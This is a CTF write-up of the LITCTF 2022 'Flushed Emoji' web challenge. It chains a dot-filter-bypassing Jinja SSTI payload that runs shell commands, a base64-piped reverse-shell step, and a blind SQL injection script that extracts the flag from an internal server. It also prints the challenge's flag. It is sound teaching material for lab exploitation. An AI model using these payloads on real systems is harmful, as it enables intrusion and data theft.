---
title: "Flushed Emoji challenge Writeup"
author: "0xMesbaha"
cover: "/media/CTFs/Flag.png"
tags: ["CTF", "ssti", "sql-injection"]
date: 2022-07-25T12:49:18+34:08
draft: false
categories:
  - web
---

Lexington Informatics Tournament CTF CTF 2022 was held from the 22nd of July Until the 25th of the month , and we have participated under the team 0xcha0s, we have managed to solve multiple challenges. this challenge was solved less than 50 times in the 3 days and it was really nice.

<!--more-->

|             |                                               |
| ----------- | --------------------------------------------- |
| CTF name    | [LITCTF 2022](https://ctftime.org/event/1694) |
| challenge   | Flushed Emoji                                 |
| category    | web                                           |
| about       | SSTI , SQL injection                          |
| description | Flushed emojis are so cool!!                  |
| points      | 250                                           |
| team        | [0xCha0s](https://ctftime.org/team/168238)    |

# Discovery

we are given source code , so we can start from there

![image](/media/CTFs/Flushed-emoji/20220724225849.png)

### main-server

we can start checking the `main-server/main.py` file , let's check the important parts :

- there is a login function which make sure the password doesn't contain a dot

```py
def login():
	if request.method == 'POST':
		username = request.form['username']
	     password = request.form['password']
	    if('.' in password):
		    return render_template_string("lmao no way you have . in your password LOL");
```

- if we have passed the dot check , our data will be sent as a post request to a remote server we don't know its ip address
- if it didn't return True our password will be processed with the `render_template_string()` function which is known to be a factor for SSTI exploitation

```py
    r = requests.post('[Other server IP]', json={"username": alphanumericalOnly(username),"password": alphanumericalOnly(password)});
    print(r.text);
    if(r.text == "True"):
      return render_template_string("OMG you are like so good at guessing our flag I am lowkey jealoussss.");
    return render_template_string("ok thank you for your info i have now sold your password (" + password + ") for 2 donuts :)");

  return render_template("index.html");
```

- As our input doesn't have proper filtration we can try to trigger SSTI .
- However most SSTI payloads contains dots , then after some searching we come across this awesome [research](https://hackmd.io/@Chivato/HyWsJ31dI)
- the research discussing the possibility of evading the dots filters by using the following approach :

```python3
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
# to
{{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}
```

now let's go test the web application :

![image](/media/CTFs/Flushed-emoji/20220724231846.png)

Trying the above payload we have a valid SSTI exploit :

![image](/media/CTFs/Flushed-emoji/20220724232147.png)

- now we can get a reverse shell so we can try our investigation without being concerned about dots filter. however any remote ip will have `.` of course.
- we can get around this by base64 encode our reverse shell payload then :

```bash
<base64_reverse_shell> | base64 -d | bash
```

and we are in

![image](/media/CTFs/Flushed-emoji/20220724232716.png)

- if you look around in the machine you won't find any useful data , and alot of linux basic utilities are not there like `nano,vi,sudo,ssh,ssh-keygen,ss,netstat,ping,wget,curl,ifconfig,ip` and others
- our goal now is to get the IP of the remote server , we can simply search for all IPs in the machine with a simple grep regex command :

```bash
grep -rE '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' / 2>/dev/null
```

![image](/media/CTFs/Flushed-emoji/20220724233151.png)

we find this IP , and as we can't get our ip address we can check the `/etc/hosts`

![image](/media/CTFs/Flushed-emoji/20220724233311.png)

- so most probably the `172.24.0.8` is our next destination
- we can confirm that by trying to communicate with it using `python3` as it was installed on the machine :"

```py
>>> import requests
>>> r= requests.get("http://172.24.0.8:8080")
>>> print(r.text)

```

- if the communication party is not available an exception will be raised however it doesn't traceback an error.(we know port 8080 from upcoming code)

### data-server

now Let's check the `data-server/main.py` code

- here we can see the flag is inserted into the database at the data server and if we check the rest of the code we can't find any condition lead to make the flag be printed so keep `sql injeciton` in our mind

```py
con = sqlite3.connect('data.db', check_same_thread=False)

app = Flask(__name__)
flag = open("flag.txt").read();
cur = con.cursor()
cur.execute('''DROP TABLE IF EXISTS users''')
cur.execute('''CREATE TABLE users (username text, password text)''')
cur.execute(
    '''INSERT INTO users (username,password) VALUES ("flag","''' + flag + '''") '''
)
```

- we have an endpoint called `/runquery` which accepts JSON post data
- it will execute the statement without proper filters on password field
- we can know it will be error based SQLi from the True or False message errors

```py
@app.route('/runquery', methods=['POST'])
def runquery():
  request_data = request.get_json()
  username = request_data["username"];
  password = request_data["password"];
  print(password);
  cur.execute("SELECT * FROM users WHERE username='" + username + "' AND password='" + password + "'");
  rows = cur.fetchall()
  if(len(rows) > 0):
    return "True";
  return "False";
app.run(host='127.0.0.1',port=8080,debug=True)
```

- the exploitation environment is very restricted and we doesn't have many choices , we will build our script and run it in the python3 interactive terminal

## Exploitation

- Let's just confirm the server returns True or False :

```py
>>> import requests
>>> url  = "http://172.24.0.8:8080/runquery"
>>> data={'username':'test','password':'test'}
>>> r = requests.post(url,json=data)
>>> print(r.text)
False
```

- we will exploit this SQL statement

```sql
SELECT * FROM users WHERE username='<username>' AND password='<password>'
```

- we can try basic payload to alter the SQL execution :

```sql
junk' OR 1=1--
```

and it returns True indeed :

![image](/media/CTFs/Flushed-emoji/20220724234904.png)

- in This CTF challenge we know the flag format so it is really helpful , we can use `LIKE` statement in our injection

```py
import requests,string
printable = string.ascii_lowercase + string.ascii_uppercase + "0123456789"+ "{}_*-+="
flag = "LITCTF{"
while not flag.endswith('}'):
    for c in printable:
        if "True" in requests.post(url = 'http://172.24.0.8:8080/runquery', json={'username': 'test','password': f'junk\' or password like \'{flag+c}%\'--'}).text:
            flag = flag+c
            print(flag)
            break
```

Running the Exploit we can get our flag :

![image](/media/CTFs/Flushed-emoji/20220724235548.png)

```bash
LITCTF{flush3d_3m0ji_o_0}
```
